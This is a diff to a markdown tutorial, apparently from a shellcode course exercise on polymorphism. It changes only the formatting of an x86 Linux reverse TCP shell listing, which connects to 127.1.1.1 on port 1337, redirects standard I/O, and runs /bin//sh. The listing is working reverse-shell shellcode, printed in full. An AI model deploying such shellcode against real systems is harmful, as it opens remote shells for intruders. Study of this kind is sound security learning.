@@ -194,49 +194,49 @@ Finally, we'll take a look at [Reverse TCP Shell](http://shell-storm.org/shellco
 section .text
 _start:
 
-        push   0x66
-        pop    eax
-        push   0x1
-        pop    ebx
-        xor    edx,edx
-        push   edx
-        push   ebx
-        push   0x2
-        mov    ecx,esp
-        int    0x80
+        push 0x66
+        pop eax
+        push 0x1
+        pop ebx
+        xor edx,edx
+        push edx
+        push ebx
+        push 0x2
+        mov ecx,esp
+        int 0x80
 
-        xchg   edx,eax
-        mov    al,0x66
-        push   0x101017f        ; 127.1.1.1
-        push word  0x3905       ; port: 1337
-        inc    ebx
-        push   bx
-        mov    ecx,esp
-        push   0x10
-        push   ecx
-        push   edx
-        mov    ecx,esp
-        inc    ebx
-        int    0x80
+        xchg edx,eax
+        mov al,0x66
+        push 0x101017f        ; 127.1.1.1
+        push word 0x3905      ; port: 1337
+        inc ebx
+        push bx
+        mov ecx,esp
+        push 0x10
+        push ecx
+        push edx
+        mov ecx,esp
+        inc ebx
+        int 0x80
 
-        push   0x2
-        pop    ecx
-        xchg   edx,ebx
+        push 0x2
+        pop ecx
+        xchg edx,ebx
 
 loop:
-        mov    al,0x3f
-        int    0x80
-        dec    ecx
-        jns    loop
+        mov al,0x3f
+        int 0x80
+        dec ecx
+        jns loop
 
-        mov    al,0xb
-        inc    ecx
-        mov    edx,ecx
-        push   edx
-        push   0x68732f2f       ; hs//
-        push   0x6e69622f       ; nib/
-        mov    ebx,esp
-        int    0x80
+        mov al,0xb
+        inc ecx
+        mov edx,ecx
+        push edx
+        push 0x68732f2f       ; hs//
+        push 0x6e69622f       ; nib/
+        mov ebx,esp
+        int 0x80
 ```
 
 For this polymorphic exercise, we'll combine the two methods used previously, resulting in the following:
